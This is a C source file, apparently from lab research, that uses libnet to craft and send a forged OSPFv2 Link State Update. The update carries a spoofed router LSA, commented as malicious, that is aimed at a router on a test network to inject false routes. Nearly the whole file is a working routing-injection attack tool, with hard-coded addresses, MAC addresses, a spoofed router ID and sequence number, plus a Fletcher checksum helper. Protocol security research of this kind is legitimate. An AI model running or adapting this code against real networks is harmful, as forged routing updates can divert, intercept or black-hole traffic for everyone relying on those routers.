/*
 * danlujingongji.c 单路径注入攻击
 *
 *  Created on: 2018年1月15日
 *      Author: lpf
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libnet.h>
#define IP_HEADSIZE 20
#define OSPF_HEADSIZE 24
#define uint unsigned int;


unsigned short checksum(unsigned short *checkbuff,int checklen);
unsigned short  fletcher_checksum(u_char * buffer, const size_t len, const unsigned short offset);

/*unsigned short buf[] = {0x0204,0x0058,0x1e81,0x1501,0x0000,0x0001,0x0000,
0x0000,0x0000,0x0001,0x0002,0x0201,0xc0a8,0x1402,0xc0a8,0x1402,0x8000,
0x000e,0x8791,0x003c,0x0000,0x0003,0x0a81,0x1e00,0xffff,0xff00,0x0300,0x000a,0xc0a8,0x1402,0xc0a8,0x1402,
0x0200,0x000a,0x0a81,0x1801,0x0a81,0x1801,0x0200,0x000a};*/
u_char buf2[] = {0x02,0x01,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x80,0x00,
0x00,0xf8,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x02,0xc0,0xa8,0x04,0x00,0xff,0xff,0xff,0x00
,0x03,0x00,0x00,0x0a,0x0a,0x02,0x01,0x11,0x0a,0x02,0x01,0x02,0x02,0x00,0x00,0x0a};// 单路径恶意LSA
int main()
{
    //printf("%x\n",fletcher_checksum(buf2,58,14));
    //printf("%x\n",checksum(buf,80));
    //int i=0;
    //int k=10000;
    char send_msg[1000] = "";
    char err_buf[100] = "";
    u_char payload[255] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 8; /* 承载数据的长度 */
     u_char payloadlsa1[255] = {0x0a,0x02,0x01,0x11,0x0a,0x02,0x01,0x02,0x02,0x00,0x00,0x0a};
     u_long payloadlsa1_s = 12;
    libnet_t *lib_net = NULL;
    libnet_ptag_t lib_t = 0;
    // char *device = "lxcbr2"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备(修改) */
    char *device = "test0";
    unsigned char src_mac[6] = {0x00,0x16,0x3e,0xe0,0xf3,0x3a};//发送者网卡地址00:16:3e:5f:6e:48
    unsigned char dst_mac[6] = {0x00,0x16,0x3e,0xa2,0x5a,0x0a};//接收者网卡地址‎ 00:16:3e:03:69:63
    char *src_ip_str = "10.2.1.2"; //源主机IP地址
    char *dst_ip_str = "10.2.1.17"; //目的主机IP地址
 
    char *router_id_str="2.2.2.2";
    char *area_id_str="0.0.0.1";
    unsigned long src_ip,dst_ip = 0;
    unsigned long ls_id = 0;
    unsigned long link_id,link_data = 0;
    unsigned long link_id1,link_data1 = 0;
    unsigned long link_id2,link_data2 = 0;
    unsigned long router_id,area_id=0;

    /*发送恶意lsa*/
    lib_net = libnet_init(LIBNET_LINK_ADV,device,err_buf);//初始化
    if(lib_net == NULL)
    {
        perror("libnet_init error");
        exit(-1);
    }

    src_ip = libnet_name2addr4(lib_net,src_ip_str,LIBNET_RESOLVE);  //将字符串类型的ip转换为顺序网络字节流
    dst_ip = libnet_name2addr4(lib_net,dst_ip_str,LIBNET_RESOLVE);      
              
    router_id= libnet_name2addr4(lib_net,router_id_str,LIBNET_RESOLVE);
    area_id= libnet_name2addr4(lib_net,area_id_str,LIBNET_RESOLVE);
    

    lib_t = libnet_build_ospfv2_lsa_rtr(   //构造路由器lsa
                                        0,//flags
                                        0x0002,//num
                                        0xc0a80400,//id,直接用十六进制表示
                                        0xffffff00,//data，直接用十六进制表示
                                        0x03,//type
                                        0,//tos
                                        0x000a,//metric
                                        payloadlsa1,//若有多个链接，在负载中添加
                                        payloadlsa1_s,//payload长度
                                        lib_net,//libnet 句柄，libnet_init()返回的指针
                                        0//协议标记 0
                                    );

   
   if (lib_t == -1) {
        printf("libnet_build_ospfv2_lsa failure\n");
        return (-1);
    };

    lib_t = libnet_build_ospfv2_lsa(   //构造lsa头部
                                0,     //ls age
                                0x02,//opts
                                0x01,//ls type
                                0x02020202,//ls id
                                0x02020202,//advertisement router
                                0x800000f8,//seqnum序列号
                                0x8efe,//checknum从右往左读即0x9fb7
                                48,  //length
                                NULL,//payload
                                0,//payload长度
                                lib_net,//libnet 句柄，libnet_init()返回的指针
                                0//协议标记 0
                            );

    
   if (lib_t == -1) {
        perror("libnet_build_ospfv2_lsa_rtr failure\n");
        return (-2);
    };
    
    lib_t = libnet_build_ospfv2_lsu(      //构造lsu头部
    		                  1,//num of LSAs
                              NULL,
                              0,
                              lib_net,
                              0
    );
    if (lib_t == -1) {
        perror("libnet_build_ospfv2_lsu failure\n");
        return (-3);
    };

    lib_t = libnet_build_ospfv2(      //构造 ospf头部
        		                  52,//这里长度不包括ospf包头长度 60+4（lsa数量）
        		                  4,//type
        		                  router_id,//router id
        		                  area_id,//area id
        		                  0,//checknum
        		                  0,//验证类型
        		                  payload,//payload
        		                  payload_s,//payload长度
        		                  lib_net,//libnet 句柄，libnet_init()返回的指针
        		                  0//协议标记 0
        		                );
    if (lib_t == -1) {
        perror("libnet_build_ospfv2 failure\n");
        return (-4);
    };

    lib_t = libnet_build_ipv4(  //构造ip数据包
                                96,//IP_HEADSIZE+OSPF_HEADSIZE+4+60,//ip数据包总长度
                                0,//ip tos
                                500,//identification
                                0,//标识和位偏移
                                4,//生存时间
                                89,//协议
                                0,//首部校验和
                                src_ip,
                                dst_ip,
                                NULL,
                                0,
                                lib_net,
                                0
                            );
   if (lib_t == -1) {
        perror("libnet_build_ipv4 failure\n");
        return (-5);
    };

   lib_t = libnet_build_ethernet(  //构造以太网数据包  
                                    (u_int8_t *)dst_mac,  
                                    (u_int8_t *)src_mac,  
                                    0x0800, // 或者，ETHERTYPE_IP  
                                    NULL,  
                                    0,  
                                    lib_net,  
                                    0  
                                );   
   
   if (lib_t == -1) {
        perror("libnet_build_ethernet failure\n");
        return (-6);
    };
 
    int res=0;
    res = libnet_write(lib_net);    //发送数据包
    if(res == -1)
    {
        perror("libnet_write failure");
        
        exit(-1);
    }

    libnet_destroy(lib_net);    //销毁资源

    printf("eyi lsa send success\n");
 
    
    return 0;
 }

unsigned short  fletcher_checksum(u_char * buffer, const size_t len, const unsigned short offset)
{
    u_int8_t *p;
    int x, y, c0, c1;
    unsigned short checksum;
    unsigned short *csum;
    size_t partial_len, i, left = len;
    int MODX=4102;
    checksum = 0;
    int FLETCHER_CHECKSUM_VALIDATE=0xffff; 
    checksum = 0;  
      p = buffer;  
      c0 = 0;  
      c1 = 0;  
  
      while (left != 0)  
        {  
          partial_len =left<MODX?left:MODX;// MIN(left, MODX);  
  
          for (i = 0; i < partial_len; i++)  
        {  
          c0 = c0 + (p[i]&0xff);  
          c1 += c0;  
        }  
  
          c0 = c0 % 255;  
          c1 = c1 % 255;  
  
          left -= partial_len;  
        }  
  
      /* The cast is important, to ensure the mod is taken as a signed value. */  
      x = (int)((len - offset - 1) * c0 - c1) % 255;  
  
      if (x <= 0)  
        x += 255;  
      y = 510 - c0 - x;  
      if (y > 255)    
        y -= 255;  
  
      if (offset == FLETCHER_CHECKSUM_VALIDATE)  
        {  
          checksum = (short) ((c1 << 8) + c0);  
        }  
      else  
        {  
          /* 
           * Now we write this to the packet. 
           * We could skip this step too, since the checksum returned would 
           * be stored into the checksum field by the caller. 
           */  
          buffer[offset] = (u_int8_t) x;  
          buffer[offset + 1] = (u_int8_t) y;  
          for(int ii=0;ii<len;ii++){  
              //printf("%x ",buffer[ii]);  
          }  
          /* Take care of the endian issue */  
          checksum = (short) ((x << 8) | (y & 0xFF));  
        }  
  
      return checksum;  
    }  



